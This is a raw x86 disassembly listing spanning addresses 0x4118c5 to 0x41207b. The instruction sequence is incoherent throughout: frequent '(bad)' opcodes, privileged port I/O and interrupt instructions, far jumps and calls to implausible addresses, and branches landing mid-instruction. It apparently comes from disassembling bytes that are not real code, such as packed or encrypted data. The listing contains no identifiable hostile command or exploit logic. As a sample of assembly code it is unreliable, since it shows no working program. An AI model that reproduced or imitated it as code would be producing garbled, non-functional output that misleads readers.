  4118c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118c6:	rcl    al,0xde
  4118c9:	jmp    0x41187e
  4118cb:	adc    BYTE PTR [ebx+0x66],ah
  4118ce:	pop    esi
  4118cf:	fbstp  TBYTE PTR [esi]
  4118d1:	jno    0x4118ea
  4118d3:	jmp    0xb26a:0x50eaba46
  4118da:	dec    eax
  4118db:	cmp    BYTE PTR [edi+0x6f7b25ea],cl
  4118e1:	xchg   ebp,eax
  4118e2:	mov    al,ds:0xee68066c
  4118e7:	sbb    eax,0x3ad5cade
  4118ec:	jns    0x4118cb
  4118ee:	inc    eax
  4118ef:	inc    esi
  4118f1:	inc    ecx
  4118f2:	lock add DWORD PTR [esi],ecx
  4118f5:	push   es
  4118f6:	sub    DWORD PTR [ecx+0x70],0x20ee9b76
  4118fd:	shl    DWORD PTR [ebx+ebx*1+0x72b9e1f7],1
  411904:	pop    ecx
  411905:	pop    edx
  411906:	adc    ah,ch
  411908:	loope  0x4118a8
  41190a:	rcr    ah,0x70
  41190d:	lods   eax,DWORD PTR ds:[esi]
  41190e:	and    ch,BYTE PTR [ecx+0xa51e870]
  411914:	and    dh,BYTE PTR [eax+0x287121c1]
  41191a:	ror    DWORD PTR [edi-0x47],1
  41191d:	pop    edx
  41191e:	(bad)  
  41191f:	xchg   esi,eax
  411920:	jnp    0x4118c2
  411922:	enter  0x8f59,0x21
  411926:	out    0x9,eax
  411928:	dec    esi
  411929:	adc    BYTE PTR [eax-0x50],dl
  41192c:	xchg   edx,eax
  41192d:	xor    DWORD PTR [esi+0x38],eax
  411930:	or     esp,esi
  411932:	fistp  WORD PTR [edx]
  411934:	(bad)  
  411936:	shr    DWORD PTR [esi+0x70],0x1b
  41193a:	and    eax,0x9d083a7d
  41193f:	ins    DWORD PTR es:[edi],dx
  411940:	cld    
  411941:	loopne 0x411953
  411943:	jp     0x41195a
  411945:	inc    esi
  411946:	jae    0x4119b0
  411948:	ins    BYTE PTR es:[edi],dx
  411949:	mov    eax,0xb5f6ee43
  41194e:	dec    esi
  41194f:	aad    0xed
  411951:	pusha  
  411952:	add    DWORD PTR [edx],ecx
  411954:	jl     0x4119c1
  411956:	mov    al,0x34
  411958:	mov    bl,0x91
  41195a:	fadd   QWORD PTR [ebx+0x3348f7ec]
  411960:	jmp    0xc90ba3ca
  411965:	test   al,0x1b
  411967:	pop    esp
  411968:	and    bh,bh
  41196a:	icebp  
  41196b:	sub    ch,BYTE PTR [ebx]
  41196d:	pop    es
  41196e:	xchg   esp,eax
  41196f:	dec    edx
  411970:	in     eax,0xc0
  411972:	ror    ch,0xfc
  411975:	add    eax,0x9eceb49e
  41197a:	popa   
  41197b:	and    al,0xde
  41197d:	ss push eax
  41197f:	div    BYTE PTR [eax-0x7f4965b8]
  411985:	sbb    DWORD PTR ds:0x37977e31,0x15
  41198c:	or     DWORD PTR [edi-0x49],edi
  41198f:	jl     0x411987
  411991:	jle    0x411988
  411993:	jnp    0x411a08
  411995:	pop    ecx
  411996:	dec    edi
  411997:	lods   eax,DWORD PTR ds:[esi]
  411998:	mov    BYTE PTR ds:0xf57b6cf8,cl
  41199e:	add    BYTE PTR [edi+0x77],dl
  4119a1:	push   cs
  4119a2:	outs   dx,BYTE PTR ds:[esi]
  4119a3:	xchg   edi,eax
  4119a4:	pop    ds
  4119a5:	sti    
  4119a6:	dec    ebp
  4119a7:	aad    0xf3
  4119a9:	imul   DWORD PTR [esi+ebp*1]
  4119ac:	and    DWORD PTR [eax+0x4f],ebp
  4119af:	ret    
  4119b0:	in     eax,0xe7
  4119b2:	enter  0x2a57,0x75
  4119b6:	leave  
  4119b7:	outs   dx,DWORD PTR ds:[esi]
  4119b8:	test   eax,0x1316615c
  4119bd:	(bad)  
  4119be:	pop    edx
  4119bf:	sbb    al,0x36
  4119c1:	(bad)  
  4119c2:	pop    ebx
  4119c3:	cmp    DWORD PTR ds:0x6d934baa,0x9139999b
  4119cd:	or     eax,0xefd327e6
  4119d2:	xor    eax,0x67c0aba6
  4119d7:	lods   eax,DWORD PTR ds:[si]
  4119d9:	add    esi,DWORD PTR [esi+0x3a2c60ae]
  4119df:	sbb    ch,BYTE PTR ds:0xcd331865
  4119e5:	mov    dl,0x40
  4119e7:	clc    
  4119e8:	jle    0x41197f
  4119ea:	mov    edi,0xe61fd038
  4119ef:	inc    ebx
  4119f0:	test   BYTE PTR [esi-0x2b],bh
  4119f3:	test   eax,0x37a87526
  4119f8:	mov    bl,0x3c
  4119fa:	push   esi
  4119fb:	xchg   esp,eax
  4119fc:	in     eax,0x5
  4119fe:	sbb    DWORD PTR [ebp-0x3b2682a3],ebx
  411a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a05:	imul   edi,DWORD PTR [ecx+edx*4],0x32
  411a09:	xor    eax,0x328b16ff
  411a0e:	jno    0x4119e4
  411a10:	(bad)  [edx+0x2f]
  411a13:	aam    0x45
  411a15:	outs   dx,BYTE PTR ds:[esi]
  411a16:	mov    esp,0xc1940645
  411a1b:	rcr    DWORD PTR ds:[edx],0x90
  411a1f:	sub    al,0x32
  411a21:	inc    ebp
  411a22:	aaa    
  411a23:	jp     0x411a0a
  411a25:	mov    ch,0x6c
  411a27:	aas    
  411a28:	mov    ss,WORD PTR [edx+0x75cf72f6]
  411a2e:	inc    edx
  411a2f:	and    bh,BYTE PTR [ebp-0x56]
  411a32:	fs pop esp
  411a34:	loope  0x411aab
  411a36:	stc    
  411a37:	inc    ebp
  411a38:	mov    esi,0x8e61a09a
  411a3d:	rcl    BYTE PTR [edi+0x5b72403b],1
  411a43:	inc    ecx
  411a44:	xor    edi,DWORD PTR [edi+ebp*1]
  411a47:	lods   al,BYTE PTR ds:[esi]
  411a48:	pop    ecx
  411a49:	call   0x6275b47
  411a4e:	fst    DWORD PTR [ebp+0x471aea9c]
  411a54:	xor    al,ch
  411a56:	xchg   esp,eax
  411a57:	retf   
  411a58:	mov    esi,0x5ced1df2
  411a5d:	ror    BYTE PTR [esi-0x768dcf41],0x75
  411a64:	adc    eax,DWORD PTR [esi+0x1e]
  411a67:	stc    
  411a68:	mov    cl,0x96
  411a6a:	push   eax
  411a6b:	sbb    BYTE PTR [ecx+0x34],0xa5
  411a6f:	pop    esi
  411a70:	dec    ecx
  411a71:	mov    ecx,0x33f9723c
  411a76:	inc    edi
  411a77:	mov    al,0xeb
  411a79:	xchg   edi,eax
  411a7a:	push   0x3a
  411a7c:	mov    bl,0xc0
  411a7e:	out    dx,eax
  411a7f:	dec    ebx
  411a80:	(bad)
  411a85:	push   edx
  411a86:	xchg   DWORD PTR [edi-0x2c951a2e],edi
  411a8c:	daa    
  411a8d:	pop    es
  411a8e:	push   esi
  411a8f:	mov    cs,WORD PTR ds:0x292ba34d
  411a95:	ins    BYTE PTR es:[edi],dx
  411a96:	mov    ecx,0xdc800bf2
  411a9b:	jno    0x411a84
  411a9d:	jmp    0x411aef
  411a9f:	(bad)  
  411aa0:	in     eax,0x60
  411aa2:	sbb    ah,al
  411aa4:	shr    BYTE PTR [eax-0x6097c600],0x9f
  411aab:	(bad)  
  411aac:	adc    eax,0x9301ea88
  411ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab2:	(bad)  
  411ab3:	jecxz  0x411a8d
  411ab5:	jl     0x411adc
  411ab7:	mov    edi,0xf84853d
  411abc:	and    ebx,ebx
  411abe:	jne    0x411a44
  411ac0:	nop
  411ac1:	je     0x411b33
  411ac3:	inc    ebp
  411ac4:	jbe    0x411af1
  411ac6:	pop    edx
  411ac7:	xor    dl,bl
  411ac9:	in     al,dx
  411aca:	setns  BYTE PTR [edi-0x1bb5c8dc]
  411ad1:	mov    esi,0xf0b4aa82
  411ad6:	(bad)  
  411ad8:	xor    BYTE PTR [eax],cl
  411ada:	loop   0x411aac
  411adc:	les    ecx,FWORD PTR [edx]
  411ade:	dec    ecx
  411adf:	push   ecx
  411ae0:	rol    DWORD PTR [edi+ebx*2+0x67],1
  411ae4:	inc    ecx
  411ae5:	loope  0x411abe
  411ae7:	jle    0x411aa7
  411ae9:	mov    BYTE PTR [eax-0x1b],dl
  411aec:	psubw  mm2,QWORD PTR [esi]
  411aef:	pop    ds
  411af0:	fidiv  DWORD PTR [edi-0x70b7641c]
  411af6:	or     cl,BYTE PTR [eax-0x5d]
  411af9:	(bad)  
  411afa:	(bad)  
  411afb:	xchg   edx,eax
  411afc:	jbe    0x411b31
  411afe:	pop    ebx
  411aff:	and    BYTE PTR [ebp+edx*1-0x5d89e8af],dh
  411b06:	and    al,BYTE PTR [ebx]
  411b08:	aam    0xb3
  411b0a:	adc    al,0xa7
  411b0c:	push   DWORD PTR [ecx]
  411b0e:	xchg   ebp,eax
  411b0f:	pop    ss
  411b10:	xchg   esp,eax
  411b11:	outs   dx,BYTE PTR ds:[esi]
  411b12:	push   ebx
  411b13:	por    mm5,mm3
  411b16:	and    al,BYTE PTR [edi+0x5f8953a1]
  411b1c:	outs   dx,DWORD PTR ds:[esi]
  411b1d:	mov    eax,DWORD PTR [ebx-0x724f9460]
  411b23:	cmp    ebx,DWORD PTR [edi-0x26]
  411b26:	shl    DWORD PTR [esi-0x4f],0xce
  411b2a:	mov    edi,0x1e4046f3
  411b2f:	in     al,0x51
  411b31:	push   edx
  411b32:	cmp    DWORD PTR [esi+0x4635f58e],ebx
  411b38:	push   ecx
  411b39:	mov    BYTE PTR [esi+0x2e],al
  411b3c:	ret    
  411b3d:	aad    0xee
  411b3f:	cdq    
  411b40:	shl    DWORD PTR [esi+0x42431c3f],1
  411b46:	les    edx,FWORD PTR [ebp-0x32f629d7]
  411b4c:	shl    BYTE PTR [edi+0x5bf35b04],cl
  411b52:	or     al,0xcb
  411b54:	xchg   esp,eax
  411b55:	and    eax,0xaed2ebd
  411b5a:	mov    eax,0x3f155fff
  411b5f:	mov    ds:0x6ee865c0,al
  411b64:	sbb    DWORD PTR [ebp+0x71],ebp
  411b67:	or     eax,0x17127e3c
  411b6c:	jno    0x411b1e
  411b6e:	and    al,0x35
  411b70:	loope  0x411b17
  411b72:	arpl   WORD PTR [edx+ebp*8-0x2],bp
  411b76:	fidivr DWORD PTR [eax-0x497ed230]
  411b7c:	pop    es
  411b7d:	or     eax,0xd8febb0c
  411b82:	sti    
  411b83:	sbb    eax,0x18b865b8
  411b88:	or     eax,0x398157a
  411b8d:	std    
  411b8e:	push   ebx
  411b8f:	push   ebp
  411b90:	adc    al,0xbd
  411b92:	jmp    0x411b15
  411b94:	out    0xf6,eax
  411b96:	popf   
  411b97:	in     eax,0x15
  411b99:	fs cmp eax,ebp
  411b9c:	and    eax,0x8c2b841b
  411ba1:	in     al,0x8f
  411ba3:	and    edx,DWORD PTR [ecx]
  411ba5:	retf   
  411ba6:	nop    DWORD PTR [ebx+edx*4+0x55]
  411bab:	inc    edx
  411bac:	lods   eax,DWORD PTR ds:[esi]
  411bad:	sbb    BYTE PTR [esp+esi*4+0x19],bh
  411bb1:	fwait
  411bb2:	das    
  411bb3:	xor    esp,edi
  411bb5:	push   eax
  411bb6:	(bad)  [ebx+0x1f]
  411bb9:	(bad)  
  411bba:	jo     0x411c32
  411bbc:	fisttp QWORD PTR [eax+0x263af95e]
  411bc2:	xor    ebx,esi
  411bc4:	add    eax,0x62
  411bc7:	popf   
  411bc8:	sbb    al,0xe7
  411bca:	jmp    0x83a62e17
  411bcf:	inc    ecx
  411bd0:	imul   ecx,DWORD PTR [ebp-0x678979b],0x27
  411bd7:	sbb    BYTE PTR [esi-0x4fe2fb02],cl
  411bdd:	push   eax
  411bde:	in     al,0xa1
  411be0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411be2:	cwde   
  411be3:	xchg   BYTE PTR [edi-0x67],bh
  411be6:	rcr    ebx,0x1a
  411be9:	or     BYTE PTR [edx+0x3d],al
  411bec:	add    bl,dh
  411bee:	jmp    0x414a:0x2c03d220
  411bf5:	pop    ecx
  411bf6:	add    ch,BYTE PTR [edx]
  411bf8:	push   ecx
  411bf9:	jecxz  0x411c2c
  411bfb:	xchg   edx,eax
  411bfc:	mov    bl,0x89
  411bfe:	xor    BYTE PTR [edx+ebx*2],dl
  411c01:	ffreep st(0)
  411c03:	fwait
  411c04:	pop    esp
  411c05:	jnp    0x411c24
  411c07:	sub    al,0xcd
  411c09:	mov    ch,0x29
  411c0b:	ins    DWORD PTR es:[edi],dx
  411c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c0d:	stos   DWORD PTR es:[edi],eax
  411c0e:	sub    al,0xff
  411c10:	inc    ebp
  411c11:	out    dx,al
  411c12:	pop    esp
  411c13:	cmp    al,0x8
  411c15:	fsin   
  411c17:	int    0x62
  411c19:	jmp    0xa00b0c9b
  411c1e:	pusha  
  411c1f:	add    dh,BYTE PTR [esi]
  411c21:	mov    al,ds:0x1c9a7968
  411c26:	fimul  WORD PTR [esi-0x47]
  411c29:	jg     0x411c86
  411c2b:	dec    eax
  411c2c:	jg     0x411c1e
  411c2e:	(bad)  
  411c2f:	jmp    0x411c21
  411c31:	push   edx
  411c32:	xchg   edx,eax
  411c33:	(bad)  
  411c34:	hlt    
  411c35:	mov    al,0x2
  411c37:	retf   0x2ecf
  411c3a:	shr    edi,1
  411c3c:	mov    edi,0xd62845e9
  411c41:	xor    eax,0xb1e9ec4e
  411c46:	xchg   esp,eax
  411c47:	pop    ds
  411c48:	xor    ebx,DWORD PTR [esi+0x38]
  411c4b:	xchg   ebp,eax
  411c4c:	loopne 0x411cba
  411c4e:	inc    edi
  411c4f:	fidiv  DWORD PTR [edi]
  411c51:	cmovle ebp,DWORD PTR [eax+0x31]
  411c55:	int    0x94
  411c57:	jl     0x411c4a
  411c59:	pop    edi
  411c5a:	call   0xd04fe8f2
  411c5f:	xor    ebx,DWORD PTR [ecx-0x709c9e31]
  411c65:	retf   
  411c66:	pushf  
  411c67:	dec    edi
  411c68:	aaa    
  411c69:	jae    0x411c13
  411c6b:	push   cs
  411c6c:	cmp    esi,edx
  411c6e:	push   ss
  411c6f:	inc    esi
  411c70:	mov    edx,DWORD PTR ds:0x25be0d45
  411c76:	add    BYTE PTR [ebx-0x65bb315c],ah
  411c7c:	xor    ah,BYTE PTR [edi-0x7f]
  411c7f:	jl     0x411c7f
  411c81:	cmp    eax,0x2236984e
  411c86:	adc    ax,0xe717
  411c8a:	sub    ch,BYTE PTR [edx+0x1e44eefd]
  411c90:	jb     0x411c8c
  411c92:	loope  0x411c5e
  411c94:	in     al,dx
  411c95:	les    eax,FWORD PTR [edi+eax*4]
  411c98:	jae    0x411c98
  411c9a:	repnz add al,0x92
  411c9d:	xchg   ebx,eax
  411c9e:	lds    esp,FWORD PTR [ebx]
  411ca0:	add    DWORD PTR [edx-0x22184fff],ebx
  411ca6:	icebp  
  411ca7:	call   0x3ec699b7
  411cac:	ins    DWORD PTR es:[edi],dx
  411cad:	jae    0x411cfc
  411caf:	jno    0x411cd8
  411cb1:	jo     0x411c34
  411cb3:	and    al,0xfb
  411cb5:	int3   
  411cb6:	jb     0x411c3a
  411cb8:	push   ds
  411cb9:	mov    ds:0xa11276c,eax
  411cbe:	inc    ebp
  411cbf:	stc    
  411cc0:	std    
  411cc1:	mov    ebp,ecx
  411cc3:	fs dec eax
  411cc5:	xchg   esp,eax
  411cc6:	sub    ebp,DWORD PTR [edx+edi*8+0x749336ae]
  411ccd:	nop
  411cce:	mov    DWORD PTR [si-0x5b],0x526a1b70
  411cd6:	push   eax
  411cd7:	mov    cl,0xfd
  411cd9:	jp     0x411d2d
  411cdb:	enter  0x1759,0x52
  411cdf:	jl     0x411ce1
  411ce1:	dec    esi
  411ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ce3:	add    bh,BYTE PTR [ecx]
  411ce5:	xchg   esp,ecx
  411ce7:	jne    0x411d0a
  411ce9:	imul   ebp,DWORD PTR [edx-0x6],0xffffff9c
  411ced:	cmp    eax,0x121e9145
  411cf2:	cs push 0xfffffff7
  411cf5:	gs jns 0x411d09
  411cf8:	mov    dh,0x7e
  411cfa:	pop    es
  411cfb:	fisubr WORD PTR [ebx+0x10]
  411cfe:	inc    edx
  411cff:	cmp    edi,esp
  411d01:	pop    ebx
  411d02:	cmp    dl,BYTE PTR [esi]
  411d04:	jo     0x411d35
  411d06:	push   cs
  411d07:	icebp  
  411d08:	imul   ebx,DWORD PTR [esi-0x3206771e],0xffffffe1
  411d0f:	sbb    BYTE PTR [edi],bl
  411d11:	inc    esp
  411d12:	loopne 0x411d04
  411d14:	cmp    eax,0xc423c1ac
  411d19:	pop    ss
  411d1a:	push   esp
  411d1b:	push   ss
  411d1c:	jecxz  0x411cd7
  411d1e:	outs   dx,DWORD PTR ds:[esi]
  411d1f:	lock mov ebp,esi
  411d22:	xor    al,0x2a
  411d24:	(bad)  
  411d25:	out    dx,eax
  411d26:	jecxz  0x411d8f
  411d28:	shl    BYTE PTR [ebx+0x62],cl
  411d2b:	(bad)  
  411d2c:	xchg   esp,eax
  411d2d:	xchg   ecx,eax
  411d2f:	cmc    
  411d30:	jg     0x411cb2
  411d32:	mov    al,al
  411d34:	retf   
  411d35:	push   cs
  411d36:	call   0xf010:0x685976f8
  411d3d:	inc    edi
  411d3f:	(bad)  
  411d40:	cmp    al,0xf0
  411d42:	xor    ah,BYTE PTR [ebx+ebp*4-0x62]
  411d46:	popf   
  411d47:	and    edi,esp
  411d49:	xchg   edx,eax
  411d4a:	fwait
  411d4b:	mov    dl,0xe9
  411d4d:	or     ecx,esp
  411d4f:	lods   eax,DWORD PTR ds:[esi]
  411d50:	sbb    DWORD PTR [eax+0x78],esp
  411d53:	mov    bl,0x59
  411d55:	xor    esp,DWORD PTR [edx-0x23982fc5]
  411d5b:	sub    eax,0x40ce6241
  411d60:	xor    ah,bl
  411d62:	inc    esp
  411d63:	sbb    dl,BYTE PTR [edi]
  411d65:	shl    DWORD PTR [edx-0x4b],cl
  411d68:	daa    
  411d69:	rcl    ecx,1
  411d6b:	cmpxchg DWORD PTR [eax+0x5c],ecx
  411d6f:	pop    edx
  411d70:	lahf   
  411d71:	ds jecxz 0x411d0c
  411d74:	add    al,0xae
  411d76:	pushw  0x6f
  411d79:	jmp    0x411dc0
  411d7b:	retf   0xce2d
  411d7e:	mov    edi,0x712713fe
  411d83:	xchg   edi,eax
  411d84:	sub    eax,0x9f20c540
  411d89:	in     al,0x74
  411d8b:	aas    
  411d8c:	inc    edi
  411d8d:	push   esi
  411d8e:	or     cl,bh
  411d90:	and    ah,BYTE PTR [ebp-0x5265126]
  411d96:	xor    eax,DWORD PTR [esi+0x6a]
  411d99:	pop    es
  411d9a:	arpl   WORD PTR [edx-0x9664f9a],si
  411da0:	and    al,0xc9
  411da2:	daa    
  411da3:	call   0x590abf70
  411da8:	dec    esp
  411da9:	pop    ebx
  411daa:	adc    dl,BYTE PTR [ecx]
  411dac:	in     eax,dx
  411dad:	mov    ds:0xf08c47b,eax
  411db2:	sub    DWORD PTR [esi],ecx
  411db4:	dec    ebp
  411db5:	outs   dx,DWORD PTR ds:[esi]
  411db6:	add    BYTE PTR [edi+esi*4-0x26],dl
  411dba:	es call 0xa2ac:0x20e57396
  411dc2:	fisttp QWORD PTR [edx-0x456ca3e]
  411dc8:	cmp    eax,0x9cdbd000
  411dcd:	hlt    
  411dce:	jle    0x411d5c
  411dd0:	xchg   esp,eax
  411dd1:	mul    BYTE PTR [edi+0x9cecdd6]
  411dd7:	sbb    DWORD PTR [edx+edx*1-0x8e7a119],ebx
  411dde:	arpl   WORD PTR [ebp-0x44],bx
  411de1:	repnz into 
  411de3:	ja     0x411db9
  411de5:	jo     0x411d8b
  411de7:	and    al,0xe2
  411de9:	lods   eax,DWORD PTR ds:[esi]
  411dea:	inc    ebx
  411deb:	sbb    ecx,DWORD PTR [edx-0x2695734d]
  411df1:	jecxz  0x411d90
  411df3:	adc    eax,0xb8966ed2
  411df8:	ror    BYTE PTR [eax+0x6c7730c1],cl
  411dfe:	jne    0x411d9b
  411e00:	fadd   DWORD PTR [edi+esi*8+0x62]
  411e04:	pop    edx
  411e05:	sub    al,0x6e
  411e07:	add    BYTE PTR [ebx],bl
  411e09:	jae    0x411e0b
  411e0b:	push   ss
  411e0c:	pop    es
  411e0d:	ret    
  411e0e:	cmp    cl,cl
  411e10:	mov    DWORD PTR [edx-0x7f06750b],esp
  411e16:	mov    bl,BYTE PTR [edx-0x72]
  411e19:	call   0xfb148c48
  411e1e:	loop   0x411da5
  411e20:	stc    
  411e21:	repnz sub ecx,DWORD PTR [ecx+0x2a25a127]
  411e28:	push   0xffffffcf
  411e2a:	test   DWORD PTR [eax+0x2f9d4d75],eax
  411e30:	xchg   esp,eax
  411e31:	mov    eax,0xf35502ac
  411e36:	je     0x411e52
  411e38:	addr16 push ss
  411e3a:	adc    eax,0x1168ccd1
  411e3f:	aad    0xe7
  411e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e42:	xchg   edi,eax
  411e43:	fcmove st,st(1)
  411e45:	pop    esp
  411e46:	pop    esi
  411e47:	call   0x1ac3:0xc17d094e
  411e4e:	and    eax,0x531492cc
  411e53:	fnstsw WORD PTR [edi+0x1d]
  411e56:	aas    
  411e57:	dec    ecx
  411e58:	jbe    0x411e23
  411e5a:	add    eax,0xfd45d582
  411e5f:	arpl   WORD PTR [esi+0x61],cx
  411e62:	imul   ebx,DWORD PTR [ebx-0x3],0x4e
  411e66:	sbb    ebp,DWORD PTR [edx+0x4e]
  411e69:	ffree  st(4)
  411e6b:	xchg   ebx,eax
  411e6c:	lea    esp,[ecx+0x69d06c7c]
  411e72:	bound  ebp,QWORD PTR [ecx-0x70a20a5e]
  411e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e79:	xchg   ecx,eax
  411e7a:	pop    ds
  411e7b:	ss leave 
  411e7d:	je     0x411ea1
  411e7f:	sub    DWORD PTR [edi-0x6a],0x0
  411e83:	clc    
  411e84:	pop    ss
  411e85:	pop    esi
  411e86:	sub    al,0x84
  411e88:	push   ecx
  411e89:	ret    0xea18
  411e8c:	and    esp,DWORD PTR [esi+esi*1]
  411e8f:	inc    edi
  411e90:	imul   edi,DWORD PTR [ebx],0x32
  411e93:	and    BYTE PTR [esp+edi*1-0x6c],ch
  411e97:	lds    edx,FWORD PTR [edx]
  411e99:	lahf   
  411e9a:	std    
  411e9b:	ja     0x411e64
  411e9d:	inc    ebp
  411e9e:	leave  
  411e9f:	sbb    al,0xe8
  411ea1:	adc    esp,DWORD PTR [ebp+0x9]
  411ea4:	push   ebx
  411ea5:	div    DWORD PTR [ecx+0x57983620]
  411eab:	stos   DWORD PTR es:[edi],eax
  411eac:	jp     0x411e82
  411eae:	mov    ds:0x503911aa,eax
  411eb3:	popa   
  411eb4:	ror    bh,1
  411eb6:	inc    ebp
  411eb7:	out    dx,al
  411eb8:	mov    ds:0x3ff78988,eax
  411ebd:	cmp    eax,0x2552df6
  411ec2:	(bad)  
  411ec4:	retf   0xfbe8
  411ec7:	fidivr WORD PTR [ecx-0x39]
  411eca:	sbb    al,0xd3
  411ecc:	dec    eax
  411ecd:	xchg   esi,eax
  411ece:	shr    edi,cl
  411ed0:	outs   dx,BYTE PTR ds:[esi]
  411ed1:	paddsb mm6,QWORD PTR [esi+edi*1]
  411ed5:	jno    0x411e70
  411ed7:	or     BYTE PTR [ebx],dh
  411ed9:	jbe    0x411ed2
  411edb:	and    esp,ebx
  411edd:	inc    ecx
  411ede:	push   ebp
  411edf:	out    0x8b,al
  411ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ee2:	dec    eax
  411ee3:	push   esi
  411ee4:	into   
  411ee5:	jne    0x411f25
  411ee7:	js     0x411eff
  411ee9:	test   esp,ebx
  411eeb:	mov    al,ds:0x5ce9bc62
  411ef0:	outs   dx,BYTE PTR ds:[esi]
  411ef1:	jmp    0x405e:0xe73539a9
  411ef8:	ins    DWORD PTR es:[edi],dx
  411ef9:	out    0xdf,eax
  411efb:	into   
  411efc:	xchg   ebp,eax
  411efd:	(bad)  
  411efe:	jb     0x411ee9
  411f00:	jg     0x411ed2
  411f02:	push   ds
  411f03:	inc    edi
  411f04:	inc    edi
  411f05:	adc    DWORD PTR [edi+0x785cd75b],edi
  411f0b:	je     0x411ecf
  411f0d:	inc    edi
  411f0e:	pop    esp
  411f0f:	mov    dl,BYTE PTR [ebp+0x4dfd3344]
  411f15:	cmovge edi,DWORD PTR [ebx+0x6ac9b58a]
  411f1c:	sub    esi,DWORD PTR [ebp+0x203423f4]
  411f22:	(bad)  
  411f23:	jmp    0x411f9b
  411f25:	jo     0x411ee6
  411f27:	pop    edi
  411f28:	stc    
  411f29:	arpl   WORD PTR [edi+0x48fcb8ec],bx
  411f2f:	xchg   ebp,esp
  411f31:	retf   
  411f32:	fcmovnbe st,st(6)
  411f34:	xchg   edx,eax
  411f35:	cld    
  411f36:	cli    
  411f37:	lock jp 0x411ec8
  411f3a:	xchg   esp,eax
  411f3b:	(bad)  
  411f3c:	jae    0x411f03
  411f3e:	mov    al,0x92
  411f40:	ror    eax,0x61
  411f43:	adc    cl,cl
  411f45:	sbb    DWORD PTR [ebp+0x1763255b],eax
  411f4b:	repnz inc ecx
  411f4d:	and    eax,0x838b0281
  411f52:	add    esp,DWORD PTR [ecx]
  411f54:	neg    DWORD PTR [esi-0x16f79a95]
  411f5a:	sbb    eax,0x77c9cf4a
  411f5f:	mov    edi,0x2d71d449
  411f64:	push   cs
  411f65:	sub    DWORD PTR ds:0x729b933b,eax
  411f6b:	adc    DWORD PTR [ebp-0x37edd5ba],esi
  411f71:	push   esp
  411f72:	cmp    edi,DWORD PTR [ebp+0x11d90505]
  411f78:	push   ecx
  411f79:	clc    
  411f7a:	jbe    0x411f34
  411f7c:	mov    cl,0xc6
  411f7e:	xlat   BYTE PTR ds:[ebx]
  411f7f:	add    BYTE PTR [ebx-0x1d],bh
  411f82:	and    BYTE PTR [edi+0x5c],0x3e
  411f86:	iret   
  411f87:	(bad)  
  411f88:	and    BYTE PTR [edx+0x1f],bl
  411f8b:	pop    ebp
  411f8c:	idiv   DWORD PTR [edi]
  411f8e:	rol    BYTE PTR [esi+eiz*2+0x759610e],cl
  411f95:	push   ecx
  411f96:	mov    bl,0xdc
  411f98:	xor    dl,dl
  411f9a:	dec    edx
  411f9b:	leave  
  411f9c:	imul   eax,esi,0xdfb3fb2a
  411fa2:	add    ebp,DWORD PTR [edx]
  411fa4:	loope  0x411f73
  411fa6:	push   ebp
  411fa7:	and    esp,eax
  411fa9:	push   0x2f
  411fab:	sub    edx,esp
  411fad:	cmp    eax,0xb2465041
  411fb2:	xor    ch,BYTE PTR [esi+esi*8+0x21]
  411fb6:	mov    ecx,0x280892a
  411fbb:	lds    esp,FWORD PTR [eax]
  411fbd:	push   edi
  411fbe:	mov    ebx,0xbd10b5eb
  411fc3:	inc    di
  411fc5:	jge    0x411fc2
  411fc7:	in     eax,0xe6
  411fc9:	les    ebp,FWORD PTR [edi]
  411fcb:	jmp    0x411f9a
  411fcd:	sar    BYTE PTR [edi+0x57c05e2e],cl
  411fd3:	imul   ebx,ebx,0x45763a2
  411fd9:	shr    ebx,1
  411fdb:	loope  0x411f80
  411fdd:	ret    0x287a
  411fe0:	in     eax,0xda
  411fe2:	xchg   edi,eax
  411fe3:	pop    edx
  411fe4:	or     DWORD PTR [ebx-0x35],ecx
  411fe7:	test   DWORD PTR es:[eax-0x71],ebx
  411feb:	ror    bl,1
  411fed:	loope  0x411fe9
  411fef:	add    bl,BYTE PTR ds:0xc96278f9
  411ff5:	out    0xd7,eax
  411ff7:	push   cs
  411ff8:	shl    BYTE PTR [ecx+0x1cdf1779],1
  411ffe:	popa   
  411fff:	dec    ebx
  412000:	fwait
  412001:	pop    esp
  412002:	(bad)  
  412003:	mov    ecx,0x419028fe
  412008:	mov    al,BYTE PTR [esi]
  41200a:	idiv   BYTE PTR [esi+ecx*1-0x7677b021]
  412011:	pop    eax
  412012:	arpl   ax,sp
  412014:	outs   dx,BYTE PTR ds:[esi]
  412015:	add    BYTE PTR [edx+0x60b28b95],bl
  41201b:	dec    esp
  41201c:	and    BYTE PTR [esi-0x68603ef7],dl
  412022:	pop    es
  412023:	(bad)  
  412025:	aad    0x2d
  412027:	ss xor eax,0x22305ef9
  41202d:	push   0xffffffa8
  41202f:	push   es
  412030:	jg     0x412074
  412032:	cmp    BYTE PTR [ecx],0xac
  412035:	pop    cx
  412037:	aad    0xe2
  412039:	jp     0x41200d
  41203b:	sbb    edi,DWORD PTR ds:0x7785fa38
  412041:	bound  edx,QWORD PTR [eax]
  412043:	sub    DWORD PTR ds:0x5dfb2cc8,0xffffffce
  41204a:	pop    esp
  41204b:	mov    ?,edx
  41204d:	xlat   BYTE PTR ds:[ebx]
  41204e:	inc    edx
  41204f:	dec    ebp
  412050:	inc    esp
  412051:	sub    bl,BYTE PTR [esp+eiz*2+0x39c59e2e]
  412058:	into   
  412059:	(bad)  
  41205a:	jae    0x41209c
  41205c:	inc    esp
  41205d:	mov    DWORD PTR [ebp+0x2c],ecx
  412060:	jge    0x412027
  412062:	sbb    DWORD PTR [ebp+edi*1-0x6],ebp
  412066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412067:	ins    BYTE PTR es:[edi],dx
  412068:	cdq    
  412069:	fucom  st(1)
  41206b:	cmp    DWORD PTR [edx-0x42],edx
  41206e:	push   ds
  41206f:	push   ds
  412070:	ror    DWORD PTR [edi-0x7f],cl
  412073:	mov    al,ds:0x6add241
  412078:	stc    
  412079:	inc    esi
  41207a:	scas   eax,DWORD PTR es:[edi]
  41207b:	inc    edx
